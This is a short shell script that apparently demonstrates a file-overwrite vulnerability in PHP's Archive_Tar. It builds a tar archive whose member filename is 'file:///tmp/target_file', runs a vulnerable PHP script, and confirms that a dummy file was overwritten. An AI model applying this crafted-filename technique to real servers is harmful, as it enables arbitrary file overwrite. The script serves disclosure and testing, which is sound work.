#!/bin/sh

# Create a dummy file that we aim to alter
echo "test" > /tmp/target_file

# Check the contents of the file (will say 'test')
echo "cat /tmp/target_file => `cat /tmp/target_file`"

# Create our tar archive with filename specified as file:///tmp/target_file
python create_tar.py

# Call the vulnerable script that uses Archive_Tar
php vulnerable.php

# Confirm that the contents of the dummy file created above have been overwritten (will say 'whatever')
echo "cat /tmp/target_file => `cat /tmp/target_file`"

# Cleanup
rm exploit.tar /tmp/target_file
